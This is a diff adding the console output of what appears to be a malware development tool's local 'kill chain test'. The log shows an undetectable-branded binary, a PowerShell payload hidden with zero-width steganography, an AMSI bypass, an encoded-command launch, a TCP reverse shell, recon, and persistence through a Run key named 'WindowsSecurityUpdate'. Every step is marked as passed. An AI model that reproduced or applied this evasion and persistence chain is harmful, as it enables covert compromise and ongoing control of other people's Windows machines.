@@ -1,0 +1,48 @@
+﻿
+  [96m[1m[*][0m Delivery binary (--skip-build)
+  [92m[+][0m ghost_fud.exe  [2m109,056 bytes (existing)[0m
+
+  [96m[1m[*][0m Generating invisible PS1 for 127.0.0.1:4443
+  [92m[+][0m Invisible PS1 generated  [2m11,472 bytes (zero-width steg)[0m
+
+  [92m[1m╔═══ LOCAL KILL CHAIN TEST (iter 1) ══════════════════════╗[0m
+  [92m║  invisible PS1 -> AMSI bypass -> TCP -> recon -> persist       ║[0m
+  [92m╚══════════════════════════════════════════════════════════════════╝[0m
+
+
+  [96m[1m[*][0m TCP listener on :4443
+  [92m[+][0m TCP armed
+
+  [96m[1m[*][0m Launching payload via -EncodedCommand
+  [92m[+][0m Payload launched  [2mPS PID=21884[0m
+
+  [96m[1m[*][0m Waiting for TCP callback (AMSI bypass + TcpClient)
+  [2m    waiting for TCP... (29s)[0m   
+  [2m    waiting for TCP... (29s)[0m   
+  [92m[+][0m TCP shell connected  [2m127.0.0.1:56055[0m
+  [2m    banner: 'OK>'[0m
+
+  [96m[1m[*][0m Recon
+  [92m[+][0m whoami  [2mlaptop-r32m8mli\gwu07[0m
+  [92m[+][0m hostname  [2mLAPTOP-R32M8MLI[0m
+  [92m[+][0m $env:COMPUTERNAME  [2mLAPTOP-R32M8MLI[0m
+
+  [96m[1m[*][0m Persistence (HKCU Run key)
+  [92m[+][0m Persist set  [2mHKCU\Run\WindowsSecurityUpdate[0m
+
+  [96m[1m[*][0m Verify persist key
+  [92m[+][0m PERSIST VERIFIED  [2mkey exists in registry[0m
+  [2m    persist key cleaned up (local test only)[0m
+
+  [1m════════════════════════════════════════════════════════════[0m
+  [1mVERDICT: [92m[1mPASS[0m  (8/8 steps)[0m
+  [92m  + TCP armed[0m
+  [92m  + Payload launched[0m
+  [92m  + TCP shell connected[0m
+  [92m  + whoami[0m
+  [92m  + hostname[0m
+  [92m  + $env:COMPUTERNAME[0m
+  [92m  + Persist set[0m
+  [92m  + PERSIST VERIFIED[0m
+  [1m════════════════════════════════════════════════════════════[0m
+
